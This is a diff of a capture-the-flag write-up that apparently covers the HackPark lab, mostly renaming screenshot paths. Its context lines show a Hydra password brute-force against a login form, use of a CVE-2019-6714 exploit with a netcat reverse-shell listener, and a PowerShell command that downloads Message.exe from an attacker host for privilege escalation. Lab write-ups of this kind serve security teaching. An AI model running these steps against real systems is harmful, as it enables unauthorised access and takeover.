@@ -8,17 +8,17 @@
 
 **What request type is the Windows website login form using?**
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
 
 **Crafting request for Hydra**
 
 Sent a failed login request to Burp to see what it would look like. With this info I was able to craft my request for hydra. I just needed to get the URL and everything that is sent after VIEWSTATE and just change the input to use ^USER^ and ^PASS^ to brute force these fields.
 
-<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
 
 I could also do this without burp by just opening the console and getting the info from there
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```bash
@@ -26,7 +26,7 @@ hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.t
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption><p>Credentials found</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (3).png" alt=""><figcaption><p>Credentials found</p></figcaption></figure>
 
 ### Compromise the machine
 
@@ -44,7 +44,7 @@ CVE-2019-6714
 
 Created the file mentioned in the exploit, just changed the IP to my IP.
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 Setup a nc listener&#x20;
 
@@ -62,7 +62,7 @@ Navigate to the link and the nc listener should have caught it
 
 <figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 ### **Windows Privilege Escalation**
 
@@ -157,7 +157,7 @@ cd C:\Program Files (x86)\SystemScheduler
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.218.233:81/Message.exe','Message.exe')"
 ```
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>
 
